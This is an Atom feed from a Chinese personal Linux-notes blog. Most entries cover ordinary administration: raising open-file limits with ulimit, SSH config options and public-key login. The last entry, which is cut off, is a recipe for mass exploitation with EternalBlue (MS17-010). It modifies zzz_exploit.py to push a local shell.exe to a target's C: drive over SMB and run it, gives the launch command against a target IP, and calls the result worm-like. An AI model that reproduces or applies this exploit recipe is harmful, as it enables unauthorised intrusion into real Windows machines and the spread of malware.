<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>默小文</title>
  
  <subtitle>我只是做了个笔记而已</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://lfoder.github.io/"/>
  <updated>2019-04-05T12:02:15.803Z</updated>
  <id>http://lfoder.github.io/</id>
  
  <author>
    <name>lfoder</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>too many open files(打开的文件过多)解决方法</title>
    <link href="http://lfoder.github.io/2019/04/05/too-many-open-files-%E6%89%93%E5%BC%80%E7%9A%84%E6%96%87%E4%BB%B6%E8%BF%87%E5%A4%9A-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <id>http://lfoder.github.io/2019/04/05/too-many-open-files-打开的文件过多-解决方法/</id>
    <published>2019-04-05T11:56:11.000Z</published>
    <updated>2019-04-05T12:02:15.803Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、产生原因"><a href="#一、产生原因" class="headerlink" title="一、产生原因"></a>一、产生原因</h3><p>too many open files(打开的文件过多)是Linux系统中常见的错误，从字面意思上看就是说程序打开的文件数过多，不过这里的files不单是文件的意思，也包括打开的通讯链接(比如socket)，正在监听的端口等等，所以有时候也可以叫做句柄(handle)，这个错误通常也可以叫做句柄数超出系统限制。<br>引起的原因就是进程在某个时刻打开了超过系统限制的文件数量以及通讯链接数，通过命令ulimit -a可以查看当前系统设置的最大句柄数是多少：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[tomcat@localhost bin]$ <span class="built_in">ulimit</span> -a</span><br><span class="line">core file size          (blocks, -c) 0</span><br><span class="line">data seg size           (kbytes, -d) unlimited</span><br><span class="line">scheduling priority             (-e) 0</span><br><span class="line">file size               (blocks, -f) unlimited</span><br><span class="line">pending signals                 (-i) 14732</span><br><span class="line">max locked memory       (kbytes, -l) 64</span><br><span class="line">max memory size         (kbytes, -m) unlimited</span><br><span class="line">open files                      (-n) 1024</span><br><span class="line">pipe size            (512 bytes, -p) 8</span><br><span class="line">POSIX message queues     (bytes, -q) 819200</span><br><span class="line">real-time priority              (-r) 0</span><br><span class="line">stack size              (kbytes, -s) 10240</span><br><span class="line">cpu time               (seconds, -t) unlimited</span><br><span class="line">max user processes              (-u) 1024</span><br><span class="line">virtual memory          (kbytes, -v) unlimited</span><br><span class="line">file locks                      (-x) unlimited</span><br></pre></td></tr></table></figure><p>open files那一行就代表系统目前允许单个进程打开的最大句柄数，这里是1024。<br>使用命令<strong>lsof -p 进程id</strong>可以查看单个进程所有打开的文件详情，使用命令<strong>lsof -p 进程id | wc -l</strong>可以统计进程打开了多少文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[tomcat@localhost bin]$ jps</span><br><span class="line">3092 Bootstrap</span><br><span class="line">3197 Jps</span><br><span class="line">[tomcat@localhost bin]$ lsof -p 3092 | wc -l</span><br><span class="line">108</span><br></pre></td></tr></table></figure><p>以裸启动的tomcat为例，可以看到它目前打开了108个文件数，如果文件数过多使用<strong>lsof -p 进程id</strong>命令无法完全查看的话，可以使用<strong>lsof -p 进程id &gt; openfiles.log</strong>将执行结果内容输出到日志文件中查看。</p><h3 id="二、解决方法"><a href="#二、解决方法" class="headerlink" title="二、解决方法"></a>二、解决方法</h3><h4 id="1、增大允许打开的文件数——命令方式"><a href="#1、增大允许打开的文件数——命令方式" class="headerlink" title="1、增大允许打开的文件数——命令方式"></a>1、增大允许打开的文件数——命令方式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -n 2048</span><br></pre></td></tr></table></figure><p>这样就可以把当前用户的最大允许打开文件数量设置为2048了，但这种设置方法在<strong>重启后会还原为默认值</strong>。<br><strong>ulimit -n</strong>命令非root用户只能设置到4096。<br>想要设置到8192需要sudo权限或者root用户。</p><h4 id="2、增大允许打开的文件数——修改系统配置文件"><a href="#2、增大允许打开的文件数——修改系统配置文件" class="headerlink" title="2、增大允许打开的文件数——修改系统配置文件"></a>2、增大允许打开的文件数——修改系统配置文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/security/limits.conf  </span><br><span class="line"><span class="comment">#在最后加入  </span></span><br><span class="line">* soft nofile 4096  </span><br><span class="line">* hard nofile 4096</span><br></pre></td></tr></table></figure><p>或者只加入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* - nofile 8192</span><br></pre></td></tr></table></figure><p>最前的 * 表示所有用户，可根据需要设置某一用户，例如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">roy soft nofile 8192  </span><br><span class="line">roy hard nofile 8192</span><br></pre></td></tr></table></figure><p>注意”nofile”项有两个可能的限制措施。就是项下的hard和soft。 要使修改过得最大打开文件数生效，必须对这两种限制进行设定。 如果使用”-“字符设定, 则hard和soft设定会同时被设定。</p><h4 id="3、检查程序问题"><a href="#3、检查程序问题" class="headerlink" title="3、检查程序问题"></a>3、检查程序问题</h4><p>如果你对你的程序有一定的解的话，应该对程序打开文件数(链接数)上限有一定的估算，如果感觉数字异常，请使用第一步的<strong>lsof -p 进程id &gt; openfiles.log</strong>命令，获得当前占用句柄的全部详情进行分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1）打开的这些文件是不是都是必要的？</span><br><span class="line">2）定位到打开这些文件的代码</span><br><span class="line">3）是否程序操作了文件写入，但是没有进行正常关闭</span><br><span class="line">4）是否程序进行了通讯，但是没有正常关闭(也就是没有超时结束的机制)</span><br></pre></td></tr></table></figure><p>如果程序中存在这些问题的话，无论系统句柄数设置的多么大，随着时间的推移，也一定会占用完。</p><blockquote><p>内容版权归原作者所有  资源转载自: <a href="https://blog.csdn.net/roy_70/article/details/78423880" target="_blank" rel="noopener">https://blog.csdn.net/roy_70/article/details/78423880</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、产生原因&quot;&gt;&lt;a href=&quot;#一、产生原因&quot; class=&quot;headerlink&quot; title=&quot;一、产生原因&quot;&gt;&lt;/a&gt;一、产生原因&lt;/h3&gt;&lt;p&gt;too many open files(打开的文件过多)是Linux系统中常见的错误，从字面意思上看就是说程
      
    
    </summary>
    
      <category term="Linux 笔记" scheme="http://lfoder.github.io/categories/Linux-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Linux" scheme="http://lfoder.github.io/tags/Linux/"/>
    
      <category term="ulimit" scheme="http://lfoder.github.io/tags/ulimit/"/>
    
  </entry>
  
  <entry>
    <title>SSH Config 配置与使用(让你的SSH更智能)</title>
    <link href="http://lfoder.github.io/2019/03/22/SSH-Config-%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8-%E8%AE%A9%E4%BD%A0%E7%9A%84SSH%E6%9B%B4%E6%99%BA%E8%83%BD/"/>
    <id>http://lfoder.github.io/2019/03/22/SSH-Config-配置与使用-让你的SSH更智能/</id>
    <published>2019-03-22T04:38:58.000Z</published>
    <updated>2019-04-05T11:56:53.928Z</updated>
    
    <content type="html"><![CDATA[<h3 id="使用-SSH-Config自动化-让-SSH-更智能"><a href="#使用-SSH-Config自动化-让-SSH-更智能" class="headerlink" title="使用 SSH-Config自动化  让 SSH 更智能"></a>使用 SSH-Config自动化  让 SSH 更智能</h3><ol><li>首先生成你的公私钥，如果已经有了可以跳过。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">➜  .ssh ssh-keygen              </span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/Users/l/.ssh/id_rsa): </span><br><span class="line">/Users/l/.ssh/id_rsa already exists.</span><br><span class="line">Overwrite (y/n)? y</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /Users/l/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /Users/l/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:j25r4OHzWxQa9IdT6eiPtX3vTm6AXFrUpBwFhUCDcCI l@l.local</span><br><span class="line">The key<span class="string">'s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 2048]----+</span></span><br><span class="line"><span class="string">|      E +..o=ooB+|</span></span><br><span class="line"><span class="string">|       o +.o.ooo.|</span></span><br><span class="line"><span class="string">|        . =o..o  |</span></span><br><span class="line"><span class="string">|         o.+. o  |</span></span><br><span class="line"><span class="string">|        S... =   |</span></span><br><span class="line"><span class="string">|      o  +. = .  |</span></span><br><span class="line"><span class="string">|     o o. o+ o ..|</span></span><br><span class="line"><span class="string">|      +.o.. o .oo|</span></span><br><span class="line"><span class="string">|       ==o     =*|</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br></pre></td></tr></table></figure><ol><li>配置 <code>~/.ssh/config</code> 文件，如果没有，请自行创建。</li></ol><p><img src="/Users/l/Library/Application Support/typora-user-images/image-20190322131801697.png" alt="image-20190322131801697"></p><p>内容大致写成这样  <code>Host</code>  后面内容可以随意填写 </p><p>然后连接过程 如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ssh hg</span><br><span class="line">Last login: Fri Mar 22 13:02:21 2019 from 192.168.1.111</span><br><span class="line">[root@localhost ~]<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>通过执行 <code>$ ssh example</code> 我就可以登录我的服务器。而不需要敲更多的命令 <code>$ ssh root@example.com</code>。又如我们想要向服务器传文件 <code>$ scp a.txt example:/home/user_name</code>。比以前方便多了。</p><p>更过相关帮助文档请参考 <code>$ man ssh_config 5</code></p><h3 id="SSH-Config-配置说明"><a href="#SSH-Config-配置说明" class="headerlink" title="SSH Config 配置说明"></a>SSH Config 配置说明</h3><p>SSH 的配置文件有两个：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ~/.ssh/config            <span class="comment"># 用户配置文件</span></span><br><span class="line">$ /etc/ssh/ssh_config      <span class="comment"># 系统配置文件</span></span><br></pre></td></tr></table></figure><h4 id="SSH-Config-字段介绍"><a href="#SSH-Config-字段介绍" class="headerlink" title="SSH Config 字段介绍"></a>SSH Config 字段介绍</h4><p>~/.ssh/config 字段介绍</p><p><strong>Host</strong><br>用于我们执行 SSH 命令的时候如何匹配到该配置。</p><ul><li><code>*</code>，匹配所有主机名。</li><li><code>*.example.com</code>，匹配以 .example.com 结尾。</li><li><code>!*.dialup.example.com,*.example.com</code>，以 ! 开头是排除的意思。</li><li><code>192.168.0.?</code>，匹配 192.168.0.[0-9] 的 IP。</li></ul><p><strong>AddKeysToAgent</strong><br>是否自动将 key 加入到 <code>ssh-agent</code>，值可以为 no(default)/confirm/ask/yes。</p><p>如果是 yes，key 和密码都将读取文件并以加入到 agent ，就像 <code>ssh-add</code>。其他分别是询问、确认、不加入的意思。添加到 ssh-agent 意味着将私钥和密码交给它管理，让它来进行身份认证。</p><p><strong>AddressFamily</strong><br>指定连接的时候使用的地址族，值可以为 any(default)/inet(IPv4)/inet6(IPv6)。</p><p><strong>BindAddress</strong><br>指定连接的时候使用的本地主机地址，只在系统有多个地址的时候有用。在 UsePrivilegedPort 值为 yes 的时候无效。</p><p><strong>ChallengeResponseAuthentication</strong><br>是否响应支持的身份验证 chanllenge，yes(default)/no。</p><p><strong>Compression</strong><br>是否压缩，值可以为 no(default)/yes。</p><p><strong>CompressionLevel</strong><br>压缩等级，值可以为 1(fast)-9(slow)。6(default)，相当于 gzip。</p><p><strong>ConnectionAttempts</strong><br>退出前尝试连接的次数，值必须为整数，1(default)。</p><p><strong>ConnectTimeout</strong><br>连接 SSH 服务器超时时间，单位 s，默认系统 TCP 超时时间。</p><p><strong>ControlMaster</strong><br>是否开启单一网络共享多个 session，值可以为 no(default)/yes/ask/auto。需要和 ControlPath 配合使用，当值为 yes 时，ssh 会监听该路径下的 control socket，多个 session 会去连接该 socket，它们会尽可能的复用该网络连接而不是重新建立新的。</p><p><strong>ControlPath</strong><br>指定 control socket 的路径，值可以直接指定也可以用一下参数代替：</p><ul><li>%L 本地主机名的第一个组件</li><li>%l 本地主机名（包括域名）</li><li>%h 远程主机名（命令行输入）</li><li>%n 远程原始主机名</li><li>%p 远程主机端口</li><li>%r 远程登录用户名</li><li>%u 本地 ssh 正在使用的用户名</li><li>%i 本地 ssh 正在使用 uid</li><li>%C 值为 %l%h%p%r 的 hash</li></ul><p>请最大限度的保持 ControlPath 的唯一。至少包含 %h，%p，%r（或者 %C）。</p><p><strong>ControlPersist</strong><br>结合 ControlMaster 使用，指定连接打开后后台保持的时间。值可以为 no/yes/整数，单位 s。如果为 no，最初的客户端关闭就关闭。如果 yes/0，无限期的，直到杀死或通过其它机制，如：ssh -O exit。</p><p><strong>GatewayPorts</strong><br>指定是否允许远程主机连接到本地转发端口，值可以为 no(default)/yes。默认情况，ssh 为本地回环地址绑定了端口转发器。</p><p><strong>HostName</strong><br>真实的主机名，默认值为命令行输入的值（允许 IP）。你也可以使用 %h，它将自动替换，只要替换后的地址是完整的就 ok。</p><p><strong>IdentitiesOnly</strong><br>指定 ssh 只能使用配置文件指定的 identity 和 certificate 文件或通过 ssh 命令行通过身份验证，即使 ssh-agent 或 PKCS11Provider 提供了多个 identities。值可以为 no(default)/yes。</p><p><strong>IdentityFile</strong><br>指定读取的认证文件路径，允许 DSA，ECDSA，Ed25519 或 RSA。值可以直接指定也可以用一下参数代替：</p><ul><li>%d，本地用户目录 ~</li><li>%u，本地用户</li><li>%l，本地主机名</li><li>%h，远程主机名</li><li>%r，远程用户名</li></ul><p><strong>LocalCommand</strong><br>指定在连接成功后，本地主机执行的命令（单纯的本地命令）。可使用 %d，%h，%l，%n，%p，%r，%u，%C 替换部分参数。只在 PermitLocalCommand 开启的情况下有效。</p><p><strong>LocalForward</strong><br>指定本地主机的端口通过 ssh 转发到指定远程主机。格式：LocalForward [bind_address:]post host:hostport，支持 IPv6。</p><p><strong>PasswordAuthentication</strong><br>是否使用密码进行身份验证，yes(default)/no。</p><p><strong>PermitLocalCommand</strong><br>是否允许指定 LocalCommand，值可以为 no(default)/yes。</p><p><strong>Port</strong><br>指定连接远程主机的哪个端口，22(default)。</p><p><strong>ProxyCommand</strong><br>指定连接的服务器需要执行的命令。%h，%p，%r</p><p>如：ProxyCommand /usr/bin/nc -X connect -x 192.0.2.0:8080 %h %p</p><p><strong>User</strong><br>登录用户名</p><h4 id="管理多组密钥对"><a href="#管理多组密钥对" class="headerlink" title="管理多组密钥对"></a>管理多组密钥对</h4><p>有时候你会针对多个服务器有不同的密钥对，每次通过指定 <code>-i</code> 参数也是非常的不方便。比如你使用 github 和 coding。那么你需要添加如下配置到 <code>~/.ssh/config</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Host github</span><br><span class="line">    HostName %h.com</span><br><span class="line">    IdentityFile ~/.ssh/id_ecdsa_github</span><br><span class="line">    User git</span><br><span class="line">Host coding</span><br><span class="line">    HostName git.coding.net</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa_coding</span><br><span class="line">    User git</span><br></pre></td></tr></table></figure><p>当你克隆 coding 上的某个仓库时：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 原来</span><br><span class="line">$ git clone git@git.coding.net:deepzz/test.git</span><br><span class="line"></span><br><span class="line"># 现在</span><br><span class="line">$ git clone coding:deepzz/test.git</span><br></pre></td></tr></table></figure><h4 id="vim-访问远程文件"><a href="#vim-访问远程文件" class="headerlink" title="vim 访问远程文件"></a>vim 访问远程文件</h4><p>vim 可以直接编辑远程服务器上的文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vim scp://root@example.com//home/centos/docker-compose.yml</span><br><span class="line">$ vim scp://example//home/centos/docker-compose.yml</span><br></pre></td></tr></table></figure><h4 id="远程服务当本地用"><a href="#远程服务当本地用" class="headerlink" title="远程服务当本地用"></a>远程服务当本地用</h4><p>通过 LocalForward 将本地端口上的数据流量通过 ssh 转发到远程主机的指定端口。感觉你是使用的本地服务，其实你使用的远程服务。如远程服务器上运行着 Postgres，端口 5432（未暴露端口给外部）。那么，你可以：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host db</span><br><span class="line">    HostName db.example.com</span><br><span class="line">    LocalForward 5433 localhost:5432</span><br></pre></td></tr></table></figure><p>当你连接远程主机时，它会在本地打开一个 5433 端口，并将该端口的流量通过 ssh 转发到远程服务器上的 5432 端口。</p><p>首先，建立连接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh db</span><br></pre></td></tr></table></figure><p>之后，就可以通过 Postgres 客户端连接本地 5433 端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ psql -h localhost -p 5433 orders</span><br></pre></td></tr></table></figure><h4 id="多连接共享"><a href="#多连接共享" class="headerlink" title="多连接共享"></a>多连接共享</h4><p>什么是多连接共享？在你打开多个 shell 窗口时需要连接同一台服务器，如果你不想每次都输入用户名，密码，或是等待连接建立，那么你需要添加如下配置到 <code>~/.ssh/config</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ControlMaster auto</span><br><span class="line">ControlPath /tmp/%r@%h:%p</span><br></pre></td></tr></table></figure><h4 id="禁用密码登录"><a href="#禁用密码登录" class="headerlink" title="禁用密码登录"></a>禁用密码登录</h4><p>如果你对服务器安全要求很高，那么禁用密码登录是必须的。因为使用密码登录服务器容易受到暴力破解的攻击，有一定的安全隐患。那么你需要编辑服务器的系统配置文件 <code>/etc/ssh/sshd_config</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PasswordAuthentication no</span><br><span class="line">ChallengeResponseAuthentication no</span><br></pre></td></tr></table></figure><h4 id="关键词登录"><a href="#关键词登录" class="headerlink" title="关键词登录"></a>关键词登录</h4><p>为了更方便的登录服务器，我们也可以省略用户名和主机名，采用关键词登录。那么你需要添加如下配置到 <code>~/.ssh/config</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Host deepzz                        # 别名</span><br><span class="line">    HostName deepzz.com            # 主机地址</span><br><span class="line">    User root                      # 用户名</span><br><span class="line">    # IdentityFile ~/.ssh/id_ecdsa # 认证文件</span><br><span class="line">    # Port 22                      # 指定端口</span><br></pre></td></tr></table></figure><p>那么使用 <code>$ ssh deepzz</code> 就可以直接登录服务器了。</p><h4 id="代理登录"><a href="#代理登录" class="headerlink" title="代理登录"></a>代理登录</h4><p>有的时候你可能没法直接登录到某台服务器，而需要使用一台中间服务器进行中转，如公司内网服务器。首先确保你已经为服务器配置了公钥访问，并开启了agent forwarding，那么你需要添加如下配置到 <code>~/.ssh/config</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Host gateway</span><br><span class="line">    HostName proxy.example.com</span><br><span class="line">    User root</span><br><span class="line">Host db</span><br><span class="line">    HostName db.internal.example.com                  # 目标服务器地址</span><br><span class="line">    User root                                         # 用户名</span><br><span class="line">    # IdentityFile ~/.ssh/id_ecdsa                    # 认证文件</span><br><span class="line">    ProxyCommand ssh gateway netcat -q 600 %h %p      # 代理命令</span><br></pre></td></tr></table></figure><p>那么你现在可以使用 <code>$ ssh db</code> 连接了。</p><h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><p>[1] <a href="https://www.freebsd.org/cgi/man.cgi?query=ssh_config" target="_blank" rel="noopener">https://www.freebsd.org/cgi/man.cgi?query=ssh_config</a></p><p>[2] <a href="https://zh.wikipedia.org/wiki/Secure_Shell" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Secure_Shell</a></p><p>[3] <a href="http://wowubuntu.com/ssh-tips.html" target="_blank" rel="noopener">http://wowubuntu.com/ssh-tips.html</a></p><p>[4] <a href="https://deepzz.com/post/how-to-setup-ssh-config.html" target="_blank" rel="noopener">https://deepzz.com/post/how-to-setup-ssh-config.html</a></p>]]></content>
    
    <summary type="html">
    
      SSH Config 可以配置你的SSH链接域名 以及认证 可以更便捷更智能的使用SSH
    
    </summary>
    
      <category term="Linux 笔记" scheme="http://lfoder.github.io/categories/Linux-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Linux" scheme="http://lfoder.github.io/tags/Linux/"/>
    
      <category term="SSH自动化登录" scheme="http://lfoder.github.io/tags/SSH%E8%87%AA%E5%8A%A8%E5%8C%96%E7%99%BB%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>SSH使用公私钥authorized_keys授权认证登陆</title>
    <link href="http://lfoder.github.io/2019/03/22/SSH%E4%BD%BF%E7%94%A8%E5%85%AC%E7%A7%81%E9%92%A5authorized_keys%E6%8E%88%E6%9D%83%E8%AE%A4%E8%AF%81%E7%99%BB%E9%99%86/"/>
    <id>http://lfoder.github.io/2019/03/22/SSH使用公私钥authorized_keys授权认证登陆/</id>
    <published>2019-03-22T04:24:56.000Z</published>
    <updated>2019-03-22T05:15:21.492Z</updated>
    
    <content type="html"><![CDATA[<h3 id="使用公私钥authorized-keys授权认证登陆"><a href="#使用公私钥authorized-keys授权认证登陆" class="headerlink" title="使用公私钥authorized_keys授权认证登陆"></a>使用公私钥authorized_keys授权认证登陆</h3><p>1、ssh-keygen做密码验证可以使在向对方机器上ssh ,scp不用使用密码.具体方法如下:<br>2、两个节点都执行操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p> 然后全部回车,采用默认值.<br>3、这样生成了一对密钥，存放在用户目录的~/.ssh下。<br><strong>将公钥考到对方机器</strong>，并将其复制到~/.ssh/authorized_keys中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat id_dsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>4、设置文件和目录权限：</p><p>设置authorized_keys权限<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chmod 600 authorized_keys</span><br></pre></td></tr></table></figure></p><p>设置.ssh目录权限<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chmod 700 -R .ssh</span><br></pre></td></tr></table></figure></p><p> 5、要保证.ssh和authorized_keys都只有用户自己有写权限。否则验证无效。（今天就是遇到这个问题，找了好久问题所在），其实仔细想想，这样做是为了不会出现系统漏洞。</p><p>6、编辑 <code>/etc/ssh/sshd_config</code> 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile      .ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>将这两行前面的注释符 <code>#</code> 号去掉，重启 ssh 服务即可。</p><figure class="highlight plain"><figcaption><span>sshd restart```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CentOS 7 重启SSH命令:</span><br></pre></td></tr></table></figure><p>systemctl restart sshd.service<br><code>`</code></p><blockquote><p>知识信息点来自：<a href="https://blog.csdn.net/xiaoyida11/article/details/51557174" target="_blank" rel="noopener">https://blog.csdn.net/xiaoyida11/article/details/51557174</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      SSH使用公私钥登陆，免输入密码
    
    </summary>
    
      <category term="Linux 笔记" scheme="http://lfoder.github.io/categories/Linux-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Linux" scheme="http://lfoder.github.io/tags/Linux/"/>
    
      <category term="SSH免密登录" scheme="http://lfoder.github.io/tags/SSH%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>永恒之蓝MS17-010批量自动化渗透姿势</title>
    <link href="http://lfoder.github.io/2019/02/27/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%89%B9%E9%87%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B8%97%E9%80%8F%E5%A7%BF%E5%8A%BF/"/>
    <id>http://lfoder.github.io/2019/02/27/永恒之蓝MS17-010批量自动化渗透姿势/</id>
    <published>2019-02-27T08:20:15.000Z</published>
    <updated>2019-02-27T08:31:10.780Z</updated>
    
    <content type="html"><![CDATA[<h3 id="克隆GIthub源码"><a href="#克隆GIthub源码" class="headerlink" title="克隆GIthub源码"></a>克隆GIthub源码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/LFODER/MS17-010</span><br></pre></td></tr></table></figure><h3 id="修改过程"><a href="#修改过程" class="headerlink" title="修改过程"></a>修改过程</h3><p><code>zzz_exploit.py</code>  会在C盘根目录创建 <code>pwded.txt</code> 文件，修改它来执行你的Payload.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">smb_pwn</span><span class="params">(conn, arch)</span>:</span></span><br><span class="line">smbConn = conn.get_smbconnection()</span><br><span class="line">print(<span class="string">'creating file c:\\pwned.txt on the target'</span>)</span><br><span class="line">tid2 = smbConn.connectTree(<span class="string">'C$'</span>)</span><br><span class="line">fid2 = smbConn.createFile(tid2, <span class="string">'/pwned.txt'</span>)</span><br><span class="line">smbConn.closeFile(tid2, fid2)</span><br><span class="line">smbConn.disconnectTree(tid2)</span><br></pre></td></tr></table></figure><p>在此代码段后面加上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smb_send_file(smbConn, <span class="string">'/opt/shell.exe'</span>, <span class="string">'C'</span>, <span class="string">'/shell.exe'</span>)     </span><br><span class="line">service_exec(conn, r<span class="string">'cmd /c  c:\\shell.exe'</span>)</span><br></pre></td></tr></table></figure><p>这两行代码的意思是通过SMB发送文件，将 本地的 <code>/opt/shell.exe</code> 发送至被攻击机器的 <code>C:\shell.exe</code> 并执行 <code>shell.exe</code> 。</p><p>最终，在命令行终端 输入 <code>python zzz_exploit.py [IP]</code> 来实施攻击。</p><blockquote><p>被攻击机器会收到来自攻击机发送的恶意文件并执行，从而自动化渗透，实现蠕虫病毒的效果。</p></blockquote><h3 id="场景实例"><a href="#场景实例" class="headerlink" title="场景实例"></a>场景实例</h3><p>一台VPS，在VPS上 <code>/etc/ssh/sshd_config</code>最后加上一句<code>GatewayPorts yes</code> 